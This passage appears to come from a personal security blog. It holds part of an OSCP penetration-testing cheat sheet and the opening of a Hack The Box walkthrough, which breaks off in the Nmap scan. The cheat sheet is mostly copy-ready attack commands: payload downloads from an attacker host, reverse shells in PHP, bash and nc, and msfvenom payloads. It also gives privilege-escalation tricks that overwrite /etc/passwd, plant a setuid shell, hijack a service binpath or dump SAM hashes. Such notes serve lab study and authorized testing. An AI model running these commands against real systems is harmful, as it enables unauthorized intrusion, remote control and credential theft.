<pre><code class="language-console" data-lang="console">sudo python3 -m http.server 80 --dir /home/kali/tools
</code></pre><h4 id="windows">Windows</h4>
<pre><code class="language-console" data-lang="console">iex(new-object net.webclient).downloadstring(&quot;http://192.168.42.42/evil.ps1)
certutil.exe -urlcache -split -f &quot;http://192.168.42.42/nc.exe&quot; nc.exe
IWR -Uri &quot;http://192.168.42.42/n64.exe&quot; -Outfile &quot;n64.exe&quot;
</code></pre><h4 id="linux">Linux</h4>
<pre><code class="language-console" data-lang="console">curl http://192.168.42.42/evil.php --output evil.php
</code></pre><h3 id="ftp">FTP</h3>
<p>If there is an ftp server which we have access, we can upload files there through it, the &quot;&rdquo; is the same for both, windows or linux:</p>
<pre><code class="language-console" data-lang="console">Connect and login with:

ftp 192.168.42.42

Upload the files with:

put evil.py

Sometimes is needed to enter in passive mode before doing anything, if is the case, just type:

pass

followed by enter
</code></pre><h3 id="sockets">Sockets</h3>
<p>Using nc/ncat is possible to create as a listener to upload/download stuff through them, the syntax for nc and ncat is basically the same.
Create the socket with:</p>
<pre><code class="language-console" data-lang="console">Attacker:
  nc -lvnp 443 &lt; evil.php

For both cases from windows, the only difference is to write nc.exe

Victim:
  nc -v 192.168.42.42 443 &gt; evil.php
</code></pre><h3 id="rdp">RDP</h3>
<p>If we have access to a windows machine with a valid user/credentials and this user is in the &ldquo;Remote Desktop Users&rdquo;, we can share a local directorie as a mount volume through rdp itself once we connect to the machine:</p>
<pre><code class="language-console" data-lang="console">rdesktop -g 1600x800 -r disk:tmp=/usr/share/windows-binaries 192.168.30.30 -u pelota -p -
</code></pre><h2 id="pivoting">Pivoting</h2>
<p>It&rsquo;s possible to do pivoting by using proxychains, pure nc&rsquo;s or in case of linux just some fifo files (I will write them down this another methods down maybe in a future), I have used during all the OSCP an awesome tool called (sshuttle)[https://github.com/sshuttle/sshuttle] (it&rsquo;s a transparent proxy server that works like &ldquo;a vpn&rdquo;, and doesn&rsquo;t require with super rights, only thing needed is that the bastion server you will use, needs to have installed python) and sometimes some SSH Forwarding. Something worth to mention nmap doesn&rsquo;t work through sshuttle.</p>
<h3 id="sshuttle">sshuttle</h3>
<h4 id="one-hop">One hop</h4>
<p>Let&rsquo;s say we are in an intranet and we have compromised a firewall that gives us access to the management net (fw.example.mgmt - ips 192.168.20.35 and 192.168.30.253 as the management ip), by using sshuttle we can create a &ldquo;vpn&rdquo; to talk directly to those servers, for that, we use:</p>
<pre><code class="language-console" data-lang="console">sshuttle ceso@192.168.20.35 192.168.30.0/24
</code></pre><h4 id="multi-hops">Multi-hops</h4>
<p>Now imagine that after we broke up into the management net after some some enumeration, we ended to compromise a machine that has also access to a production environment (foreman.example.mgmt - ips 192.168.30.40 and 192.168.25.87), we can take advantage of sshuttle + ProxyCommand of ssh to create a &ldquo;vpn&rdquo; through this multiple hops, so&hellip;putting it down, this will be kind of as follow (the diagram is extremly simplified and just for the sake of illustrate this visually, so it doesn&rsquo;t intend to provide a 100% precise network diagram):</p>

    <img src="/images/cheatsheet/multiple-hop-sshuttle.png"  class="center"  style="border-radius: 8px;"  />


<p>To have that working, is needed to put the next conf in your ssh conf file (normally ~/.ssh/config. It&rsquo;s based on the example above, but is easy to extrapolate to different scenarios):</p>
<pre><code class="language-console" data-lang="console">Host fw.example.mgmt
  Hostname 192.168.20.35
  User userOnFw
  IdentityFile ~/.ssh/priv_key_fw
Host foreman.example.mgmt
  Hostname 192.168.30.40
  User root
  ProxyJump fw.example.mgmt
  IdentityFile ~/.ssh/priv_key_internal
</code></pre><p>And now to setup the &ldquo;multiple hop vpn&rdquo;, run:</p>
<pre><code class="language-console" data-lang="console">sshuttle -r foreman.example.mgmt -v 192.168.25.0/24 &amp;

Later on is possible to connect from the local machine:
ssh foo@192.168.25.74
</code></pre><h2 id="reverse-shells">Reverse shells</h2>
<h3 id="php">php</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span> $sock <span style="color:#f92672">=</span> <span style="color:#a6e22e">fsockopen</span>(<span style="color:#e6db74">&#34;192.168.42.42&#34;</span>,<span style="color:#e6db74">&#34;443&#34;</span>); $proc <span style="color:#f92672">=</span> <span style="color:#a6e22e">proc_open</span>(<span style="color:#e6db74">&#34;/bin/sh -i&#34;</span>, <span style="color:#66d9ef">array</span>(<span style="color:#ae81ff">0</span><span style="color:#f92672">=&gt;</span>$sock, <span style="color:#ae81ff">1</span><span style="color:#f92672">=&gt;</span>$sock, <span style="color:#ae81ff">2</span><span style="color:#f92672">=&gt;</span>$sock), $pipes); <span style="color:#75715e">?&gt;</span>
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">php -r &#39;$sock=fsockopen(&#34;192.168.42.42&#34;,443);exec(&#34;/bin/sh -i <span style="color:#960050;background-color:#1e0010">&lt;</span><span style="color:#960050;background-color:#1e0010">&amp;</span>3 &gt;<span style="color:#960050;background-color:#1e0010">&amp;</span>3 2&gt;&amp;3&#34;);&#39;
</code></pre></div><h3 id="bash">bash</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bash -i &gt;&amp; /dev/tcp/192.168.42.42/443 0&gt;&amp;<span style="color:#ae81ff">1</span>
</code></pre></div><h3 id="sh--nc">sh + nc</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2&gt;&amp;<span style="color:#ae81ff">1</span> | nc 192.168.42.42 <span style="color:#ae81ff">443</span> &gt;/tmp/f
</code></pre></div><h3 id="perl-example-deploy-as-cgi-bin">Perl (example deploy as cgi-bin)</h3>
<pre><code class="language-console" data-lang="console">msfvenom -p cmd/unix/reverse_perl LHOST=&quot;192.168.42.42&quot; LPORT=443 -f raw -o reverse_shell.cgi
</code></pre><h3 id="java-example-to-deploy-on-tomcat">Java (example to deploy on tomcat)</h3>
<pre><code class="language-console" data-lang="console">msfvenom -p java/shell_reverse_tcp LHOST=192.168.42.42 LPORT=443 -f war  rev_shell.war
</code></pre><h3 id="windows-htpp-download-reverse-shell">Windows HTPP download reverse shell</h3>
<pre><code class="language-console" data-lang="console">msfvenom -a x86 --platform windows -p windows/exec CMD=&quot;powershell \&quot;IEX(New-Object Net.WebClient).downloadString('http://192.168.42.42/Invoke-PowerShellTcp.ps1')\&quot;&quot; -e x86/unicode_mixed BufferRegister=EAX -f python
</code></pre><h3 id="windows-staged-reverse-tcp">Windows staged reverse TCP</h3>
<pre><code class="language-console" data-lang="console"> msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.42.42 LPORT=443  EXITFUNC=thread -f exe -a x86 --platform windows -o reverse.exe
</code></pre><h3 id="windows-stageless-reverse-tcp">Windows stageless reverse TCP</h3>
<pre><code class="language-console" data-lang="console">msfvenom -p windows/shell_reverse_tcp EXITFUNC=thread LHOST=192.168.42.42 LPORT=443 -f exe -o &lt;output_name.format&gt;
</code></pre><h3 id="linux-staged-reverse-tcp">Linux staged reverse TCP</h3>
<pre><code class="language-console" data-lang="console">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.42.42 LPORT=443 -f elf -o &lt;outout_name&gt;.elf
</code></pre><h3 id="linux-staged-reverse-tcp-1">Linux staged reverse TCP</h3>
<pre><code class="language-console" data-lang="console">msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.42.42 LPORT=443 -f elf -o &lt;outout_name&gt;.elf
</code></pre><h2 id="privilege-escalation">Privilege escalation</h2>
<h3 id="windows-1">Windows</h3>
<h4 id="run-as">Run-As</h4>
<pre><code class="language-console" data-lang="console">PS C:\&gt; $secstr = New-Object -TypeName System.Security.SecureString
PS C:\&gt; $username = &quot;&lt;domain&gt;\&lt;user&gt;&quot;
PS C:\&gt; $password = '&lt;password&gt;'
PS C:\&gt; $secstr = New-Object -TypeName System.Security.SecureString
PS C:\&gt; $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
PS C:\&gt; $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
PS C:\&gt; Invoke-Command -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://&lt;ip/host&gt;:&lt;port&gt;/path/to/file.evil') } -Credential $cred -Computer localhost
-----------------------------------------------------------------------------------------------------
Invoke-Command -ComputerName localhost -Creadential $credential -ScriptBlock { C:\inetpub\wwwroot\internal-01\log\nc.exe 10.10.14.4 1338 -e cmd.exe }
</code></pre><h4 id="incorrect-permisions-in-services-sc-config-binpath">Incorrect permisions in services (sc config binpath)</h4>
<p>Binpath is set as running <code>cmd.exe</code> passing a commad to execute to it (so once the process dies, the one executed by it so the command to <code>cmd.exe</code> remains):</p>
<pre><code class="language-console" data-lang="console">sc config upnphost binpath= &quot;C:\WINDOWS\System32\cmd.exe /k C:\inetpub\wwwroot\nc.exe -nv 192.168.42.42 443 -e C:\WINDOWS\System32\cmd.exe&quot; 
</code></pre><h4 id="sam--system--security">SAM + SYSTEM + Security</h4>
<p>If those 3 files are in your hands (you could download to your attacker machine), you can dump hashes and crack them:</p>
<pre><code class="language-console" data-lang="console">/usr/share/doc/python3-impacket/examples/secretsdump.py -sam SAM.bak -security SECURITY.bak -system SYSTEM.bak LOCAL

sudo john dumped_hashes --format=NT --wordlist=/usr/share/wordlists/rockyou.txt
</code></pre><h3 id="linux-1">Linux</h3>
<h4 id="homeuseropenssl-ep-empty-capabilities">/home/user/openssl =ep (empty capabilities)</h4>
<p>Make 2 copies of passwd, one as backup of the original, and one that will be used as custom:</p>
<pre><code class="language-console" data-lang="console">cp /etc/passwd /tmp/passwd.orig
cp /etc/passwd /tmp/passwd.custom
</code></pre><p>Now, a custom user will be created and added to <code>/tmp/passwd.custom</code> with <code>customPassword</code> and as root user (UID = GID = 0):</p>
<pre><code class="language-console" data-lang="console">echo 'ceso:'&quot;$( openssl passwd -6 -salt xyz customPassword )&quot;':0:0::/tmp:/bin/bash' &gt;&gt; /tmp/passwd.custom
</code></pre><p>Now, create a custom <code>key.pem</code> and <code>cert.pem</code> with openssl:</p>
<pre><code class="language-console" data-lang="console">openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes
</code></pre><p>Encrypt the new custom passwd:</p>
<pre><code class="language-console" data-lang="console">openssl smime -encrypt -aes256 -in /tmp/passwd.custom -binary -outform DER -out /tmp/passwd.enc /tmp/cert.pem
</code></pre><p>Now, decrypt the custom passwd overwritting in the process the real one (<code>/etc/passwd</code>):</p>
<pre><code class="language-console" data-lang="console">cd /
/home/ldapuser1/openssl smime -decrypt -in /tmp/passwd.enc -inform DER -inkey /tmp/key.pem -out /etc/passwd
</code></pre><p>And finally, just login with the user created with root privileges by using <code>customPassword</code>:</p>
<pre><code class="language-console" data-lang="console">su - ceso
</code></pre><h4 id="command-web-injection-add-user">Command web injection: add user</h4>
<pre><code class="language-console" data-lang="console">/usr/sbin/useradd c350 -u 4242 -g root -m -d /home/c350 -s /bin/bash -p $(echo pelota123 | /usr/bin/openssl passwd -1 -stdin) ; sed 's/:4242:0:/:0:0:/' /etc/passwd -i 
</code></pre><h4 id="nfs-no_root_squashinsecurerw">NFS; no_root_squash,insecure,rw</h4>
<p>If <code>/etc/exports</code> has a line like:</p>
<pre><code class="language-console" data-lang="console">/srv/pelota 192.168.42.0/24(insecure,rw)
/srv/pelota 127.0.0.1/32(no_root_squash,insecure,rw)
</code></pre><p>NFS is being exported and you and you have ssh access to the machine.
From your attacker machine <strong>while logged as root</strong> user run:</p>
<pre><code class="language-console" data-lang="console">ssh -f -N megumin@192.168.42.43 -L 2049:127.0.0.1:2049
mount -t nfs 127.0.0.1:/srv/pelota my_share
cd my_share
cat &gt; shell.c&lt;&lt;EOF
#include &lt;unistd.h&gt;
int main(){
  setuid(0);
  setgid(0);
  system(&quot;/bin/bash&quot;);
}
EOF
gcc shell.c -o shell
chmod u+s shell
</code></pre><p>Now from inside a SSH session on the victim machine (in this example <code>192.168.42.32</code>):</p>
<pre><code class="language-console" data-lang="console">bash-4.2$ cd /srv/pelota
bash-4.2$ ./shell
bash-4.2# id
uid=0(root) gid=0(root) groups=0(root),1000(megumin) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
</code></pre><h2 id="good-to-know-either-windows-andor-linux">Good to know (either Windows and/or Linux)</h2>
<h3 id="arch-cross-compile-exploit-and-diff-glibc-version">Arch cross compile exploit (and diff glibc version)</h3>
<pre><code class="language-console" data-lang="console">gcc -m32 -Wall -Wl,--hash-style=both -o gimme.o gimme.c
</code></pre><h3 id="ip-restriction-at-application-level-bypass">IP restriction at application level, bypass</h3>
<p>Try to send a request modifying the HTTP header by adding:</p>
<pre><code class="language-console" data-lang="console">X-Forwarder-For: &lt;ip allowed&gt;
</code></pre><h3 id="windows---check-os-information">Windows - check OS information</h3>
<pre><code class="language-console" data-lang="console">systeminfo
ver
</code></pre><h3 id="windows---check-architecture">Windows - check architecture</h3>
<pre><code class="language-console" data-lang="console">wmic os get osarchitecture
echo %PROCESSOR_ARCHITECTURE%
</code></pre><h3 id="powershell--running-as-32-or-64-bits">Powershell  running as 32 or 64 bits</h3>
<pre><code class="language-console" data-lang="console">[Environment]::Is64BitProcess   
</code></pre><h3 id="linux-lfi---intesresting-files-to-look-after">Linux LFI - intesresting files to look after</h3>
<pre><code class="language-console" data-lang="console">/proc/self/status
/proc/self/environ
/etc/passwd
/etc/hosts
/etc/exports
</code></pre><h2 id="simple-buffer-overflow-32-bits-no-aslr-and-no-dep">Simple Buffer Overflow (32 bits, NO ASLR and NO DEP)</h2>
<h3 id="summarized-steps">Summarized steps</h3>
<ul>
<li>0 - Crash the application</li>
<li>1 - Fuzzing (find aprox number of bytes where the crash took place)</li>
<li>2 - Find offset</li>
<li>3 - EIP control</li>
<li>4 - Check for enough space on buffer</li>
<li>5 - Badchars counting</li>
<li>6 - Find return address (JMP ESP)</li>
<li>7 - Create payload</li>
</ul>
<h3 id="fuzzing-example-with-vulnserver--spike-on-trun-command">Fuzzing: example with vulnserver + spike on TRUN command</h3>
<pre><code class="language-console" data-lang="console">cat &gt; trun.spk &lt;&lt;EOF
s_readline();
s_string(&quot;TRUN &quot;);
s_string_variable(&quot;COMMAND&quot;);
EOF
</code></pre><p>Now, start wireshark filtering on the target IP/PORT below and run the <code>trun.spk</code>:</p>
<pre><code class="language-console" data-lang="console">generic_send_tcp 172.16.42.131 9999 trun.spk 0 0
</code></pre><p>Once a crash takes place, go to wireshark to locate the crash.</p>
<h3 id="badchars">Badchars</h3>
<p>From the block below, the next ones were not included (most common badchars):</p>
<pre><code class="language-console" data-lang="console">\x00 --&gt; null byte
\x0a --&gt; new line character (AKA &quot;\n&quot;)
</code></pre><p>So&hellip;actual list of badchars:</p>
<pre><code class="language-console" data-lang="console">\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
</code></pre><h3 id="usefull-tools-on-kali-linux">Usefull tools (on Kali Linux)</h3>
<h4 id="create_pattern">create_pattern</h4>
<pre><code class="language-console" data-lang="console">/usr/share/metasploit-framework/tools/exploit/pattern_create.rb
/usr/bin/msf-pattern_create
</code></pre><h4 id="pattern_offset">pattern_offset</h4>
<pre><code class="language-console" data-lang="console">/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb
/usr/bin/msf-pattern_offset
</code></pre><h4 id="nasm_shell">nasm_shell</h4>
<pre><code class="language-console" data-lang="console">/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
/usr/bin/msf-nasm_shell
</code></pre><h4 id="msfvenom">msfvenom</h4>
<pre><code class="language-console" data-lang="console">/usr/share/metasploit-framework/msfvenom
/usr/bin/msfvenom
</code></pre><h3 id="shellcode-poc-calcexe">Shellcode POC: calc.exe</h3>
<pre><code class="language-console" data-lang="console">msfvenom -p windows/exec -b '\x00\x0A' -f python --var-name buffer CMD=calc.exe EXITFUNC=thread
</code></pre><h2 id="usefull-links">Usefull links</h2>
<h3 id="privilege-escalation-1">Privilege escalation</h3>
<h4 id="linux-2">Linux</h4>
<ul>
<li><a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></li>
<li><a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation">https://book.hacktricks.xyz/linux-unix/privilege-escalation</a></li>
<li><a href="https://guif.re/linuxeop">https://guif.re/linuxeop</a></li>
<li><a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</a></li>
<li><a href="https://www.win.tue.nl/~aeb/linux/hh/hh-8.html">https://www.win.tue.nl/~aeb/linux/hh/hh-8.html</a></li>
<li><a href="http://www.dankalia.com/tutor/01005/0100501004.htm">http://www.dankalia.com/tutor/01005/0100501004.htm</a></li>
</ul>
<h4 id="windows-2">Windows</h4>
<ul>
<li><a href="https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/">https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/</a></li>
<li><a href="http://www.fuzzysecurity.com/tutorials/16.html">http://www.fuzzysecurity.com/tutorials/16.html</a></li>
<li><a href="https://github.com/J3rryBl4nks/LPEWalkthrough/blob/master/Walkthrough.md">https://github.com/J3rryBl4nks/LPEWalkthrough/blob/master/Walkthrough.md</a></li>
<li><a href="https://github.com/worawit/MS17-010">https://github.com/worawit/MS17-010</a> <strong>&lt;&mdash;&mdash; Eternal blue without MSF</strong></li>
<li><a href="https://github.com/ankh2054/windows-pentest">https://github.com/ankh2054/windows-pentest</a></li>
<li><a href="https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html">https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html</a></li>
<li><a href="https://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html">https://hackingandsecurity.blogspot.com/2017/09/oscp-windows-priviledge-escalation.html</a></li>
<li><a href="https://github.com/frizb/Windows-Privilege-Escalation">https://github.com/frizb/Windows-Privilege-Escalation</a></li>
</ul>
<h3 id="misc">Misc</h3>
<h4 id="windows-3">Windows</h4>
<ul>
<li><a href="http://www.cheat-sheets.org/saved-copy/Windows_folders_quickref.pdf">http://www.cheat-sheets.org/saved-copy/Windows_folders_quickref.pdf</a></li>
<li><a href="https://www.lemoda.net/windows/windows2unix/windows2unix.html">https://www.lemoda.net/windows/windows2unix/windows2unix.html</a></li>
<li><a href="https://bernardodamele.blogspot.com/2011/12/dump-windows-password-hashes.html">https://bernardodamele.blogspot.com/2011/12/dump-windows-password-hashes.html</a></li>
<li><a href="https://gracefulsecurity.com/path-traversal-cheat-sheet-windows/">https://gracefulsecurity.com/path-traversal-cheat-sheet-windows/</a></li>
<li><a href="https://bernardodamele.blogspot.com/2011/12/dump-windows-password-hashes.html">https://bernardodamele.blogspot.com/2011/12/dump-windows-password-hashes.html</a></li>
<li><a href="https://malicious.link/post/2016/kerberoast-pt1/">https://malicious.link/post/2016/kerberoast-pt1/</a></li>
</ul>
<h4 id="linux-3">Linux</h4>
<ul>
<li><a href="http://www.pathname.com/fhs/pub/fhs-2.3.html">http://www.pathname.com/fhs/pub/fhs-2.3.html</a></li>
<li><a href="https://github.com/rapid7/ssh-badkeys">https://github.com/rapid7/ssh-badkeys</a></li>
<li><a href="http://www.linusakesson.net/programming/tty/">http://www.linusakesson.net/programming/tty/</a></li>
<li><a href="http://pentestmonkey.net/blog/post-exploitation-without-a-tty">http://pentestmonkey.net/blog/post-exploitation-without-a-tty</a></li>
</ul>
<h3 id="pivoting-1">Pivoting</h3>
<ul>
<li><a href="https://artkond.com/2017/03/23/pivoting-guide/">https://artkond.com/2017/03/23/pivoting-guide/</a></li>
<li><a href="https://nullsweep.com/pivot-cheatsheet-for-pentesters/">https://nullsweep.com/pivot-cheatsheet-for-pentesters/</a></li>
<li><a href="https://0xdf.gitlab.io/2019/01/28/pwk-notes-tunneling-update1.html">https://0xdf.gitlab.io/2019/01/28/pwk-notes-tunneling-update1.html</a></li>
</ul>
<h3 id="brute-forcecracking">Brute force/Cracking</h3>
<ul>
<li><a href="https://github.com/Coalfire-Research/npk">https://github.com/Coalfire-Research/npk</a> <strong>&lt;&mdash;&mdash; Distributed hash-cracking platform on serverless AWS componentes</strong></li>
<li><a href="https://hashcat.net/wiki/doku.php?id=example_hashes">https://hashcat.net/wiki/doku.php?id=example_hashes</a></li>
<li><a href="https://github.com/danielmiessler/SecLists">https://github.com/danielmiessler/SecLists</a></li>
<li><a href="https://github.com/rapid7/ssh-badkeys">https://github.com/rapid7/ssh-badkeys</a></li>
<li><a href="https://crackstation.net/">https://crackstation.net/</a></li>
</ul>
<h3 id="compiling-exploits">Compiling exploits</h3>
<ul>
<li><a href="https://stackoverflow.com/questions/4032373/linking-against-an-old-version-of-libc-to-provide-greater-application-coverage">https://stackoverflow.com/questions/4032373/linking-against-an-old-version-of-libc-to-provide-greater-application-coverage</a></li>
<li><a href="https://www.lordaro.co.uk/posts/2018-08-26-compiling-glibc.html">https://www.lordaro.co.uk/posts/2018-08-26-compiling-glibc.html</a></li>
<li><a href="https://www.offensive-security.com/metasploit-unleashed/alphanumeric-shellcode/">https://www.offensive-security.com/metasploit-unleashed/alphanumeric-shellcode/</a></li>
</ul>
<h3 id="obfuscators">Obfuscators</h3>
<ul>
<li><a href="https://github.com/danielbohannon/Invoke-Obfuscation">https://github.com/danielbohannon/Invoke-Obfuscation</a></li>
<li><a href="https://github.com/Bashfuscator/Bashfuscator">https://github.com/Bashfuscator/Bashfuscator</a></li>
</ul>
<h3 id="deobfuscators">Deobfuscators</h3>
<ul>
<li><a href="https://www.unphp.net/">https://www.unphp.net/</a></li>
<li><a href="https://lelinhtinh.github.io/de4js/">https://lelinhtinh.github.io/de4js/</a></li>
<li><a href="http://jsnice.org/">http://jsnice.org/</a></li>
<li><a href="https://github.com/java-deobfuscator/deobfuscator">https://github.com/java-deobfuscator/deobfuscator</a></li>
</ul>
<h3 id="buffer-overflows">Buffer Overflows</h3>
<ul>
<li><a href="https://github.com/justinsteven/dostackbufferoverflowgood">https://github.com/justinsteven/dostackbufferoverflowgood</a></li>
<li><a href="https://github.com/stephenbradshaw/vulnserver">https://github.com/stephenbradshaw/vulnserver</a></li>
<li><a href="https://www.vulnhub.com/entry/brainpan-1,51/">https://www.vulnhub.com/entry/brainpan-1,51/</a></li>
<li><a href="https://exploit.education/phoenix/">https://exploit.education/phoenix/</a></li>
<li><a href="https://www.youtube.com/watch?v=1S0aBV-Waeo">https://www.youtube.com/watch?v=1S0aBV-Waeo</a></li>
</ul>
<h3 id="another-oscphacking-cheatsheets">Another OSCP/Hacking Cheatsheets</h3>
<ul>
<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/">https://github.com/swisskyrepo/PayloadsAllTheThings/</a></li>
<li><a href="https://github.com/tagnullde/OSCP/blob/master/oscp-cheatsheet.md">https://github.com/tagnullde/OSCP/blob/master/oscp-cheatsheet.md</a></li>
<li><a href="https://github.com/Optixal/OSCP-PWK-Notes-Public">https://github.com/Optixal/OSCP-PWK-Notes-Public</a></li>
<li><a href="https://github.com/OlivierLaflamme/Cheatsheet-God">https://github.com/OlivierLaflamme/Cheatsheet-God</a></li>
<li><a href="https://github.com/0x4D31/awesome-oscp">https://github.com/0x4D31/awesome-oscp</a></li>
<li><a href="https://github.com/xapax/security">https://github.com/xapax/security</a></li>
<li><a href="https://book.hacktricks.xyz/">https://book.hacktricks.xyz/</a></li>
<li><a href="https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html">https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html</a></li>
<li><a href="https://www.netsecfocus.com/oscp/2019/03/29/The_Journey_to_Try_Harder-_TJNulls_Preparation_Guide_for_PWK_OSCP.html">https://www.netsecfocus.com/oscp/2019/03/29/The_Journey_to_Try_Harder-_TJNulls_Preparation_Guide_for_PWK_OSCP.html</a></li>
</ul>
]]></content>
        </item>
        
        <item>
            <title>Hack The Box - AI</title>
            <link>https://ceso.github.io/posts/2020/02/hack-the-box-ai/</link>
            <pubDate>Fri, 07 Feb 2020 00:00:00 +0000</pubDate>
            
            <guid>https://ceso.github.io/posts/2020/02/hack-the-box-ai/</guid>
            <description>Quick Summary Finally, I&amp;rsquo;m posting the walk-through of this box, currently, I&amp;rsquo;m preparing my OSCP so most of my free time goes dedicated to it :D. At the time I did this box, I was only documenting with screenshots, so some dates could differ between the write up below as I accessed now to get plain text to not overload this with screenshots.
This was a box where for the foothold, you needed to upload a .</description>
            <content type="html"><![CDATA[
    <img src="/images/htb/ai/info-card.png"  class="center"  style="border-radius: 8px;"  />


<h2 id="quick-summary">Quick Summary</h2>
<p>Finally, I&rsquo;m posting the walk-through of this box, currently, I&rsquo;m preparing my OSCP so most of my free time goes dedicated to it :D.
At the time I did this box, I was only documenting with screenshots, so some dates could differ between the write up below as I accessed now to get plain text to not overload this with screenshots.</p>
<p>This was a box where for the foothold, you needed to upload a .wav file with a sql injection to get the reverse shell (the .wav is interpreted by an AI), and for the root you needed to exploit <a href="https://docs.oracle.com/javase/1.5.0/docs/guide/jpda/jdwp-spec.html">JWDP</a>, the idea of using an AI for the foothold, was original kudos for that, but the implementation of it, and the multiple tries-error with different <a href="https://en.wikipedia.org/wiki/Speech_synthesis">TTS</a> I didn&rsquo;t like it, in summary, was a box I didn&rsquo;t feel like learning something new at all.</p>
<p>Said that, time to get our hands dirty.</p>
<h2 id="nmap">Nmap</h2>
<p>As always the enumeration starts by running Nmap:</p>
<pre><code class="language-console" data-lang="console"># Nmap 7.80 scan initiated Wed Dec 11 15:33:30 2019 as: nmap -sC -sV -O -o nmap-ai.htb 10.10.10.163
Nmap scan report for ai.htb (10.10.10.163)
Host is up (0.019s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6d:16:f4:32:eb:46:ca:37:04:d2:a5:aa:74:ed:ab:fc (RSA)
|   256 78:29:78:d9:f5:43:d1:cf:a0:03:55:b1:da:9e:51:b6 (ECDSA)
|_  256 85:2e:7d:66:30:a6:6e:30:04:82:c1:ae:ba:a4:99:bd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Hello AI!
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=12/11%OT=22%CT=1%CU=38328%PV=Y%DS=2%DC=I%G=Y%TM=5DF152
OS:AE%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=107%TI=Z%CI=Z%II=I%TS=A)SE
OS:Q(SP=108%GCD=2%ISR=108%TI=Z%CI=Z%TS=A)OPS(O1=M54DST11NW7%O2=M54DST11NW7%
OS:O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)WIN(W1=FE88%W2
OS:=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNS
OS:NW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%
OS:DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%
OS:O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%
